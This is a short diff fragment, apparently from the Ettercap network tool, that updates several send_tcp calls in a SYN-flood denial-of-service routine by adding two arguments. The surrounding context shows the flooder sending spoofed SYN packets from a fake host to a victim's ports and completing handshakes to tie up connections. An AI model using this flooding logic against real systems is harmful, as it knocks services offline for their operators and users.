@@ -180,7 +180,7 @@ EC_THREAD_FUNC(syn_flooder)
  
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
-      send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN);
+      send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN, NULL, 0);
 #if !defined(OS_WINDOWS)
       nanosleep(&tm, NULL);
 #else
@@ -195,7 +195,7 @@ EC_THREAD_FUNC(syn_flooder)
       CANCELLATION_POINT();
 
       SLIST_FOREACH(p, &port_table, next)    
-         send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN);
+         send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN, NULL, 0);
 	 
 #if !defined(OS_WINDOWS)
       nanosleep(&tm, NULL);
@@ -239,7 +239,7 @@ static void parse_tcp(struct packet_object *po)
           return;
 	  
    /* Complete the handshake with an ACK */
-   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, htonl( ntohl(po->L4.seq) + 1), TH_ACK);
+   send_tcp(&fake_host, &victim_host, po->L4.dst, po->L4.src, po->L4.ack, htonl( ntohl(po->L4.seq) + 1), TH_ACK, NULL, 0);
    
    /* Check if the port is already in the "open" list... */
    SLIST_FOREACH(p, &port_table, next) 
